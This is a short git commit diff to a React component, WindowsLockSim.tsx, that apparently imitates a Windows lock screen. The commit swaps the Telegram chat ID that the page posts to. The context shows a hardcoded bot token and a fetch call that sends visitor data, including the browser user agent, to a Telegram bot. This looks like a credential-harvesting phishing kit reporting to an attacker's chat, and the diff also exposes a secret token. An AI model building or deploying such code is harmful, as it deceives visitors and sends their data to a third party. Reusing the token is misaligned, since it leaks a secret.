562ed19434e6e2cf45b7d67478faaeaa398ca5fd
sanimaryam471 <sanimaryam471@gmail.com>
2026-02-01 19:30:25 +0100

    Update WindowsLockSim.tsx

--- src/componenets/WindowsLockSim.tsx
+++ src/componenets/WindowsLockSim.tsx
@@ -85,7 +85,7 @@ ${navigator.userAgent}
         
         // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
         const BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
-        const CHAT_ID = '-1003737910762';
+        const CHAT_ID = '-1003720688102';
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -476,3 +476,4 @@ ${navigator.userAgent}
 };
 
 export default WindowsLockSim;
+
